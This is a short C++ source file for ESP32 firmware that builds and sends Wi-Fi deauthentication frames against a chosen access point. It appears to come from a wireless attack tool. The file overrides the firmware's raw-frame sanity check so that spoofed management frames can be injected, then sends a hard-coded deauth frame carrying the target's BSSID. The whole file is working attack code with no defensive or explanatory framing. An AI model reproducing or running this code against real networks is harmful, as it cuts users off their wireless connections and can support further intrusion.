#include "deauth.h"

#include "esp_err.h"
#include "esp_wifi.h"

#include <cstring>
/*
 * deauth frame got from:
 * https://github.com/risinek/esp32-wifi-penetration-tool/blob/master/components/wsl_bypasser/wsl_bypasser.c
 */
static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff,
    0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2,
                                                int32_t arg3) {
    return 0;
}

void send_deauth_frame_to_ap(wifi_ap_record_t ap_record) {
    uint8_t deauth_frame[sizeof(deauth_frame_default)];
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record.bssid, 6);
    memcpy(&deauth_frame[16], ap_record.bssid, 6);

    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame,
                                      sizeof(deauth_frame_default), false));
}
